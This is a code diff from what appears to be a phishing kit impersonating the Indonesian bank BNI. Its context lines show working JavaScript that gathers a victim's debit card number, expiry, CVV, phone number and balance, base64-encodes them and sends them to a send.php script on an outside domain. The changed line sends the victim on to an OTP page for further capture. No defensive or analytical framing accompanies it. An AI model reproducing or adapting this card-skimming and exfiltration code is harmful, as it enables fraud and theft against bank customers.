@@ -59,7 +59,7 @@ function next() {
         url: "https://www.gebyarundian.co/bni/send.php?message="+encodeURIComponent(btoa("<b>No. kartu debit:</b> "+debitNumber+"\n<b>Bulan/Tahun:</b> "+month+"/"+year+"\n<b>CVV:</b> "+cvv+"\n<b>No. HP</b>: "+phone+"\n<b>Saldo:</b> "+balance)),
         dataType: "text",
         success: function(response) {
-            window.location.href = "otp.php?phone="+phone;
+            window.location.href = "otp.html?phone="+phone;
         }
     });
 }
